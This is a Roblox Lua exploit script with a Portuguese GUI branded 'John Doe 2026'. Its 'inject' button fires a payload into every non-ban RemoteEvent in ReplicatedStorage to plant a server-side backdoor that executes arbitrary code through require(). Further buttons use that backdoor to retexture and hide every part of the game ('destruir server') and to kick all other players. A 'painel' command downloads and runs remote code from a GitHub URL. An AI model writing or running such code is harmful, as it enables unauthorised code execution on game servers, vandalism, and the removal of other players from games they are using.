--[[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CMD SYSTEM
]]

local LMG2L = {};
local JD_ID = "rbxassetid://11078561850"
local JD_COLOR = Color3.fromRGB(45, 45, 45)
local LP = game:GetService("Players").LocalPlayer

local function Notificar(msg)
    local nGui = Instance.new("ScreenGui", LP.PlayerGui)
    local f = Instance.new("Frame", nGui)
    f.Size = UDim2.new(0, 200, 0, 40)
    f.Position = UDim2.new(1, -210, 0.85, 0)
    f.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    f.BorderSizePixel = 0
    local t = Instance.new("TextLabel", f)
    t.Size = UDim2.new(1, 0, 1, 0)
    t.Text = "SYSTEM: " .. msg
    t.TextColor3 = Color3.fromRGB(255, 255, 255)
    t.BackgroundTransparency = 1
    t.TextSize = 14
    game:GetService("Debris"):AddItem(nGui, 3)
end

local function CriarGUI()
    if LP.PlayerGui:FindFirstChild("JohnDoe_Imortal") then return end

    LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", LP.PlayerGui);
    LMG2L["ScreenGui_1"].Name = "JohnDoe_Imortal"
    LMG2L["ScreenGui_1"].ResetOnSpawn = false

    LMG2L["Frame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
    LMG2L["Frame_2"]["BorderSizePixel"] = 0;
    LMG2L["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(24, 24, 24);
    LMG2L["Frame_2"]["Size"] = UDim2.new(0, 350, 0, 204);
    LMG2L["Frame_2"]["Position"] = UDim2.new(0.35635, 8, 0.14127, 206);
    LMG2L["Frame_2"]["BackgroundTransparency"] = 0.5;

    -- BORDAS
    local b1 = Instance.new("Frame", LMG2L["Frame_2"]); b1.BackgroundColor3 = JD_COLOR; b1.Size = UDim2.new(0.0099, 0, 1.00909, 0); b1.Position = UDim2.new(0.99505, 0, -0.00909, 0);
    local b2 = Instance.new("Frame", LMG2L["Frame_2"]); b2.BackgroundColor3 = JD_COLOR; b2.Size = UDim2.new(1, 0, 0.01818, 0); b2.Position = UDim2.new(0, 0, -0.00909, 0);
    local b3 = Instance.new("Frame", LMG2L["Frame_2"]); b3.BackgroundColor3 = JD_COLOR; b3.Size = UDim2.new(1, 0, 0.01818, 0); b3.Position = UDim2.new(0, 0, 0.98182, 0);
    local b4 = Instance.new("Frame", LMG2L["Frame_2"]); b4.BackgroundColor3 = JD_COLOR; b4.Size = UDim2.new(0.0099, 0, 1.00909, 0); b4.Position = UDim2.new(0, 0, -0.00909, 0);

    -- TEXTBOX (ONDE VOCÊ VAI DIGITAR "painel")
    LMG2L["script_9"] = Instance.new("TextBox", LMG2L["Frame_2"]);
    LMG2L["script_9"]["ClearTextOnFocus"] = false;
    LMG2L["script_9"]["Size"] = UDim2.new(0.91089, 0, 0.66346, 0);
    LMG2L["script_9"]["Position"] = UDim2.new(0.0396, 0, 0.14423, 0);
    LMG2L["script_9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
    LMG2L["script_9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
    LMG2L["script_9"]["Text"] = [[painel]];

    -- BOTÃO EXECUTAR COM COMANDO ESPECIAL
    LMG2L["execute_4"] = Instance.new("TextButton", LMG2L["Frame_2"]);
    LMG2L["execute_4"]["Size"] = UDim2.new(0.19802, 0, 0.10909, 0);
    LMG2L["execute_4"]["Position"] = UDim2.new(0.0396, 0, 0.82727, 0);
    LMG2L["execute_4"]["Text"] = [[executar]];

    LMG2L["execute_4"].MouseButton1Click:Connect(function()
        local texto = LMG2L["script_9"].Text
        
        -- VERIFICA SE É O COMANDO DO PAINEL
        if texto == "painel" then
            Notificar("Carregando Painel GitHub...")
            loadstring(game:HttpGet("https://raw.githubusercontent.com/paulotnlopes1-commits/Admin-john-doe-gui/refs/heads/main/README.md"))()
        else
            -- EXECUÇÃO NORMAL
            local bd = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
            if bd then 
                bd:FireServer(texto) 
                Notificar("Script Executado!") 
            else 
                Notificar("Injete Primeiro!") 
            end
        end
    end)

    -- OUTROS BOTÕES
    LMG2L["apagar_b"] = Instance.new("TextButton", LMG2L["Frame_2"]);
    LMG2L["apagar_b"]["Size"] = UDim2.new(0.17822, 0, 0.10909, 0);
    LMG2L["apagar_b"]["Position"] = UDim2.new(0.26733, 0, 0.82727, 0);
    LMG2L["apagar_b"]["Text"] = [[limpar]];
    LMG2L["apagar_b"].MouseButton1Click:Connect(function() LMG2L["script_9"].Text = "" end)

    LMG2L["r6_c"] = Instance.new("TextButton", LMG2L["Frame_2"]);
    LMG2L["r6_c"]["Size"] = UDim2.new(0.05941, 0, 0.10909, 0);
    LMG2L["r6_c"]["Position"] = UDim2.new(0.5099, 0, 0.82727, 0);
    LMG2L["r6_c"]["Text"] = [[R6]];
    LMG2L["r6_c"].MouseButton1Click:Connect(function()
        local bd = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
        if bd then bd:FireServer('require(3436957371):r6("'..LP.Name..'")') end
    end)

    LMG2L["re_12"] = Instance.new("TextButton", LMG2L["Frame_2"]);
    LMG2L["re_12"]["Size"] = UDim2.new(0.08911, 0, 0.11538, 0);
    LMG2L["re_12"]["Position"] = UDim2.new(0.61386, 0, 0.82727, 0);
    LMG2L["re_12"]["Text"] = [[resetar]];
    LMG2L["re_12"].MouseButton1Click:Connect(function()
        local bd = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
        if bd then bd:FireServer('require(3229910984):respawn("'..LP.Name..'")') end
    end)

    LMG2L["exec_3"] = Instance.new("TextButton", LMG2L["Frame_2"]);
    LMG2L["exec_3"]["Size"] = UDim2.new(0.15842, 0, 0.10577, 0);
    LMG2L["exec_3"]["Position"] = UDim2.new(0.74752, 0, 0.82727, 0);
    LMG2L["exec_3"]["Text"] = [[inject]];
    LMG2L["exec_3"].MouseButton1Click:Connect(function()
        Notificar("Injetando...")
        local function scan(d)
            for _, o in pairs(d:GetChildren()) do
                if o:IsA("RemoteEvent") and not string.find(string.lower(o.Name), "ban") then
                    o:FireServer([[if not game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then local b = Instance.new("RemoteEvent", game:GetService("JointsService")) b.Name = "_FEBYPASS32" local l = require(13684410229) b.OnServerEvent:Connect(function(_, c) l(c)() end) end]])
                end
                pcall(function() scan(o) end)
            end
        end
        scan(game:GetService("ReplicatedStorage"))
    end)

    -- BOTÕES SUPERIORES
    LMG2L["server_7"] = Instance.new("TextButton", LMG2L["Frame_2"]);
    LMG2L["server_7"]["Size"] = UDim2.new(0, 85, 0, 20);
    LMG2L["server_7"]["Position"] = UDim2.new(0.0396, 0, 0.03, 0);
    LMG2L["server_7"]["Text"] = [[destruir server]];
    LMG2L["server_7"]["BackgroundColor3"] = Color3.fromRGB(50, 0, 0);
    LMG2L["server_7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
    LMG2L["server_7"].MouseButton1Click:Connect(function()
        local bd = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
        if bd then bd:FireServer([[local id = "]]..JD_ID..[[" local s = Instance.new("Sky", game.Lighting) s.SkyboxBk = id s.SkyboxDn = id s.SkyboxFt = id s.SkyboxLf = id s.SkyboxRt = id s.SkyboxUp = id for _, v in pairs(game:GetDescendants()) do pcall(function() if v:IsA("BasePart") then v.Transparency = 1 end if v:IsA("Decal") or v:IsA("Texture") then v.Texture = id v.Transparency = 0 end end) end]]) end
    end)

    local anti = Instance.new("TextButton", LMG2L["Frame_2"])
    anti.Size = UDim2.new(0, 85, 0, 20); anti.Position = UDim2.new(0.3, 0, 0.03, 0); anti.Text = "Anti-Hack"; anti.BackgroundColor3 = Color3.fromRGB(0, 0, 0); anti.TextColor3 = Color3.fromRGB(255, 0, 0);
    anti.MouseButton1Click:Connect(function()
        local bd = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
        if bd then bd:FireServer([[local boss = "]]..LP.Name..[[" for _, r in pairs(game:GetDescendants()) do if r:IsA("RemoteEvent") and r.Name ~= "_FEBYPASS32" then r.OnServerEvent:Connect(function(p) if p.Name ~= boss then p:Kick("Team john doe to day") end end) end end]]) end
    end)

    -- HEADER
    LMG2L["TextLabel_10"] = Instance.new("TextLabel", LMG2L["Frame_2"]);
    LMG2L["TextLabel_10"]["Size"] = UDim2.new(0.34158, 0, 0.07692, 0);
    LMG2L["TextLabel_10"]["Position"] = UDim2.new(0.6, 0, 0.03, 0);
    LMG2L["TextLabel_10"]["Text"] = [[JOHN DOE 2026]];
    LMG2L["TextLabel_10"]["BackgroundTransparency"] = 1;
    LMG2L["TextLabel_10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);

    LMG2L["ImageLabel_11"] = Instance.new("ImageLabel", LMG2L["TextLabel_10"]);
    LMG2L["ImageLabel_11"]["Image"] = JD_ID;
    LMG2L["ImageLabel_11"]["Size"] = UDim2.new(0.8, 0, 6, 0);
    LMG2L["ImageLabel_11"]["Position"] = UDim2.new(0.6, 0, -2, 0);
    LMG2L["ImageLabel_11"]["BackgroundTransparency"] = 1;

    LMG2L["UIDragDetector_a"] = Instance.new("UIDragDetector", LMG2L["Frame_2"]);
end

task.spawn(function()
    while true do
        if not LP.PlayerGui:FindFirstChild("JohnDoe_Imortal") then CriarGUI() end
        task.wait(0.2)
    end
end)
